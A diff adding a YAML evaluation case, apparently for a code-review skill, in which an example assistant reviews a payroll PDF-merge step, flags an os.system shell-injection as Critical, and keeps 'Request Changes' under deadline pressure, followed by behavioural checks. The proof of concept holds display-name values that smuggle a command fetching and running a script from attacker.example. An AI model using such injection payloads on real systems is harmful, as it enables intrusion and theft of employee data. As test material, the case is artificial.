@@ -1,0 +1,139 @@
+name: conclusion-mechanics-critical
+axis: 結論機械對應
+description: >-
+  結論不是判斷題：任何 live Critical 一律 Request Changes，其餘有 Suggestion 為
+  Approved with Comments，否則 Approved。這條軸線的失效方式很好認但很常見——
+  審查者同意問題存在，卻因為「只有一行」「下週要上線」「作者會後續處理」
+  而給出比 findings 更寬鬆的結論，或反過來把 Critical 降級來遷就想給的結論。
+  斷言鎖在「結論由 findings 推導」與「壓力不改變推導」。
+
+skill_files:
+  - skills/nathan-code-review/SKILL.md
+  - skills/nathan-code-review/references/report-format.md
+  - skills/nathan-code-review/references/review-dimensions.md
+  - skills/nathan-code-review/scripts/report_model.py
+
+scenario:
+  project: payroll-batch-runner
+  branch: feature/payslip-pdf-merge
+  summary: >-
+    薪資單批次產出流程新增一個合併步驟，把個別 PDF 併成一份寄送檔。
+    合併是透過 shell 呼叫外部工具完成，檔名來自員工資料。
+    作者在 MR 上表示時程很趕、希望先合併後補。
+
+conversations:
+  - role: user
+    content: |
+      幫我審 feature/payslip-pdf-merge，這個下週一定要上線
+
+  - role: assistant
+    content: |
+      `F-001` Critical｜C 安全｜`app/logic/payslip_batch.py:96`
+
+      ```python
+      os.system(f"pdfunite {' '.join(paths)} {output_dir}/{employee.display_name}.pdf")
+      ```
+
+      `display_name` 來自人資系統的自由文字欄位，整串交給 shell 解譯。
+      `os.system` 帶未經處理的輸入是無條件 Critical。
+
+      POC：把任一員工的顯示名稱改成
+      `alice$(curl -s https://attacker.example/x.sh | sh)`，
+      下一次批次執行時該指令會以批次程序的權限執行：
+
+      ```bash
+      # 重現：在測試環境把 display_name 設為下列值後觸發批次
+      display_name = 'alice; curl -s https://attacker.example/x.sh | sh #'
+      ```
+
+      影響範圍：批次程序讀得到全體員工的薪資、身分證字號與銀行帳號，
+      並且持有薪資資料庫與檔案伺服器的寫入權限。取得執行權即等同取得
+      這些資料，且薪資單已寄出後無法回收。
+
+      風險處置：Mitigate。修法：改用 `subprocess.run([...])` 傳 list、
+      不經 shell，並把輸出檔名改成由系統產生的識別碼（例如員工編號加
+      批次序號），不要讓自由文字進入路徑。
+
+      `F-002` Suggestion｜G 測試｜`app/logic/payslip_batch.py:96`
+      合併步驟沒有測試，含特殊字元的顯示名稱這條路徑無人覆蓋。
+
+  - role: user
+    content: |
+      這個真的只有一行，能不能先給過？我們下週一定要上，我保證下一個 MR 就修掉。
+
+  - role: assistant
+    content: |
+      我理解時程，但結論這一格不是我能讓的。
+
+      **審查結論：Request Changes**
+
+      規則是機械的：任何 live Critical → `Request Changes`；否則有 live
+      Suggestion → `Approved with Comments`；否則 `Approved`。`F-001` 現在
+      是 `status: new` 的 live Critical，所以只有這一個結論成立。
+      `report_model.py` 會擋下結論與 findings 不一致的報告，所以我也繞不過去。
+
+      這不是對時程的評價。要讓結論改變只有一條路：讓 `F-001` 不再 live——
+      也就是修掉它，或提出我沒看到的反證讓它被撤回。
+
+      補充兩點，希望對趕工有幫助：
+
+      - 修法本身確實很小，換成 `subprocess.run([...])` 傳 list 加上檔名改用
+        員工編號，大約就是那一行加上輸出路徑的組法
+      - `F-002` 那條測試缺口本身不阻擋合併，可以留到下一個 MR
+
+      改完推上來我重審，只要 `F-001` 轉成 `resolved`、沒有新的 Critical，
+      結論就會自動變成 `Approved with Comments`。
+
+behavioral_checks:
+  - id: BC-1
+    check: 存在 live Critical 時結論為 Request Changes，且說明這是推導而非選擇
+    anchor: SKILL.md § Severity — "The conclusion is not a judgement call"
+
+  - id: BC-2
+    check: 明確引用三段式規則（Critical → Request Changes；否則 Suggestion → Approved with Comments；否則 Approved）
+    anchor: references/report-format.md § Four rules 第 1 條
+
+  - id: BC-3
+    check: 指出 report_model.py 會機械擋下結論與 findings 不一致的報告
+    anchor: scripts/report_model.py NcrReport._check_invariants
+
+  - id: BC-4
+    check: os.system 帶未處理輸入被判為 Critical，且不因輸入來自內部系統而降級
+    anchor: references/review-dimensions.md § C — "eval / os.system — always Critical"
+
+  - id: BC-5
+    check: Critical 安全發現附上可執行的 POC、以敏感資料表述的影響範圍、與具體修法
+    anchor: references/review-dimensions.md § C — 三段式 payload；PHI/個資在範圍內時影響範圍要以該資料表述
+
+  - id: BC-6
+    check: 面對時程請求時，說明唯一能改變結論的方式是讓該 finding 不再 live
+    anchor: SKILL.md § Severity — Critical 必須在合併前解決
+
+  - id: BC-7
+    check: 語氣對事不對人，並在守住結論的同時給出可行的下一步
+    anchor: references/report-format.md § Tone 與 § Four rules 第 3、4 條
+
+anti_checks:
+  - id: AC-1
+    check: 不得因「只有一行」「下週上線」「作者承諾後續修」而給出 Approved 或 Approved with Comments
+    failure_mode: 結論變成協商結果，severity 隨即失去意義
+
+  - id: AC-2
+    check: 不得為了遷就想給的結論而把 Critical 降為 Suggestion 或 Nit
+    failure_mode: 反向操作同樣繞過機械規則，而且更難被發現
+
+  - id: AC-3
+    check: 不得建議以「先合併、開後續 issue 追蹤」取代修正，作為 Critical 的處置
+    failure_mode: 把阻擋條件轉成待辦事項，等於實質核可
+
+  - id: AC-4
+    check: 不得省略 POC、影響範圍或修法三者中的任何一項
+    failure_mode: 缺任一項的 Critical 不足以支撐它造成的阻擋
+
+  - id: AC-5
+    check: 不得在守住結論時轉為指責作者或評價其時程安排
+    failure_mode: 報告公開可見，對人的評價會讓後續每一條發現都被防禦性閱讀
+
+  - id: AC-6
+    check: 不得把 Suggestion 等級的測試缺口混入阻擋理由
+    failure_mode: 誇大阻擋依據會讓真正的阻擋理由被一起質疑
